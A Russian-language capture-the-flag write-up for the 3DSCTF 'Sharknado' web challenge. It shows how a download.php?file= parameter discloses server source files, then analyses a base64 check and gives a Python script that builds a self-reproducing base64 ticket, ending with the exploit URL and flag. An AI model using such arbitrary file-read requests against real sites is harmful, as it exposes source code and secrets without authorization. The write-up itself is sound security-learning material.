# Sharknado - 482 Points

Official fan page!

### Solution
Открываем сайт

[http://sharknado01.3dsctf.org:8005](http://sharknado01.3dsctf.org:8005)

![](https://github.com/texh0k0t/writeups/blob/master/3DSCTF/Sharknado/images/1.png)

Видим, что он состоит из фреймов, что не позволяет, изучить его быстро

```html
<HTML>
<HEAD><TITLE>Sharknado's Page</TITLE></HEAD>
<frameset cols="20%, 80%" noresize="noresize">
    <frame name="frame" src="menu.php">
    <frameset rows="20%, 80%">
    <frame name="title" src="title.php" noresize="noresize">
    <frame name="main" src="main.php" noresize="noresize">
</frameset>
</html>
```

Ссылок много, по этому пробежимся по всем и запишем трафик с помошью Charles

Находим страницу с интересным содержанием

![](https://github.com/texh0k0t/writeups/blob/master/3DSCTF/Sharknado/images/2.png)

[http://sharknado01.3dsctf.org:8005/download.php?file=images/poster.jpg](http://sharknado01.3dsctf.org:8005/download.php?file=images/poster.jpg)

Так же находим страницу которая имеет поля для ввода и как-то обрабатывает введенную информацию

![](https://github.com/texh0k0t/writeups/blob/master/3DSCTF/Sharknado/images/3.png)

[http://sharknado01.3dsctf.org:8005/backstage.php](http://sharknado01.3dsctf.org:8005/backstage.php)

Пробуем эксплуатировать уязвимость на этой странице

[http://sharknado01.3dsctf.org:8005/download.php?file=backstage.php](http://sharknado01.3dsctf.org:8005/download.php?file=backstage.php)

Видим исходный код

```php
<?php
session_start();
if (isset($_GET['ticket']) and isset($_GET['dives']))
{
    $ticket = $_GET['ticket'];
    $dives = $_GET['dives'];
    if ($dives < 1) {
        echo "If you want to see the backstage, you need to dive!";
    } elseif (strlen($ticket) < 4) {
        echo "Is your ticket torn?";
    } else {
        $p = 1;
        $j = 1;

        for ($i = 0; $i < $dives; $i++) {
            $b = base64_encode($ticket);
            $b = substr($b, 0, strlen($b) - $j);
            $p = $p * 10;
            $j = $j + $p;
            if ($i < ($dives - 1)) {
                $ticket = $b;
            }
        }

        $st = strlen($ticket);
        $sb = strlen($b);

        if (!$st || !$sb || ($ticket !== $b)) {
            echo "You can't enter and you can't dive!";
        } else {
            session_start();
            $_SESSION['flag'] = 1;
            echo "You're a true shark fan, he is your prize: ";
            echo require __DIR__."/flag.php";
            $_SESSION['flag'] = 0;
        }
    }
}
?>
```
Чтобы разобраться как он работает, скачиваем его себе на компьютер и поднимаем у себя

`php -S localhost:80`

Для удобства дебаггинга, код был изменен

```php
<?php
if (isset($_GET['ticket']) and isset($_GET['dives']))
{
    $ticket = $_GET['ticket'];
    $dives = $_GET['dives'];

    if ($dives < 1) {
        echo "If you want to see the backstage, you need to dive!";
    } elseif (strlen($ticket) < 4) {
        echo "Is your ticket torn?";
    } else {
        $p = 1;
        $j = 1;
	echo 'p '.$p.'<br/>';
	echo 'j '.$j.'<br/>';
	
        for ($i = 0; $i < $dives; $i++) {
            $b = base64_encode($ticket);
			echo $i.' b '.$b.'<br/>';
            $b = substr($b, 0, strlen($b) - $j);
			echo $i.' b '.$b.'<br/>';
			
            $p = $p * 10;
            $j = $j + $p;
			echo "<br/>";
			echo 'p '.$p.'<br/>';
			echo 'j '.$j.'<br/>';
			echo "<br/>";
            if ($i < ($dives - 1)) {
                $ticket = $b;
				echo "YES<br/>";
            }
        }

        $st = strlen($ticket);
        $sb = strlen($b);
		
		echo '<br/>st '.$st."<br/> sb ".$sb."<br/> ticket ".$ticket."<br/> b ".$b.'<br/>';
        if (!$st || !$sb || ($ticket !== $b)) {
            echo "You can't enter and you can't dive!";
        } else {
            echo "<script>alert(\"You're a true shark fan, he is your prize: \")</script>";

        }
    }
}
?>
```
Пример того, как это работало

![](https://github.com/texh0k0t/writeups/blob/master/3DSCTF/Sharknado/images/4.png)

После долго анализа и поиска в Google, я нашел статью о том, что существует "магический" base64, который обладает интересными свойствами

Если взять base64 от "Vm0wd2Qy", то получим "Vm0wd2QyUXk="

Где наглядно видно, что base64 от строки, повторяет саму строку и дописывает посчитанное

Vm0wd2Qy  
Vm0wd2QyUXk=

В нашем случае это то, что надо и просто нужно найти нужно значение

![](https://github.com/texh0k0t/writeups/blob/master/3DSCTF/Sharknado/images/5.png)

Ссылка на статью, где я узнал об этом

[http://xlogicx.net/?p=383](http://xlogicx.net/?p=383)

В исходном коде была проверка

```php
if (!$st || !$sb || ($ticket !== $b))
```

Из этих трех условий, возможным было обойти только

```php
$ticket !== $b
```
Чем я и занялся

Ниже представлен код на Python для решения задачи

```python
import base64 as b64

src = "Vm0wd2Qy".encode()

def b(encode_text):
	return b64.b64encode(encode_text)

for i in range(1000):
	a = b(src)
	Res1 = a[:-1]
	aa = b(Res1)
	Res2 = aa[:-11]
	aaa = b(Res2)
	Res3 = aaa[:-111]
	l = len(src)
	symbol = a[l:l+1]
	if(Res2==Res3):
		print(src.decode())
		break
	src += symbol

print("[+] Finished")
```
Вывод программы:

Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GU214U2JHdzFWVEowVjFaWFNraGh

Прямая ссылка на флаг:

[http://sharknado01.3dsctf.org:8005/backstage.php?ticket=Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GU214U2JHdzFWVEowVjFaWFNraGh&dives=3](http://sharknado01.3dsctf.org:8005/backstage.php?ticket=Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GU214U2JHdzFWVEowVjFaWFNraGh&dives=3)

Флаг:

> 3DS{N1c3_F1Xed_Po1nT}
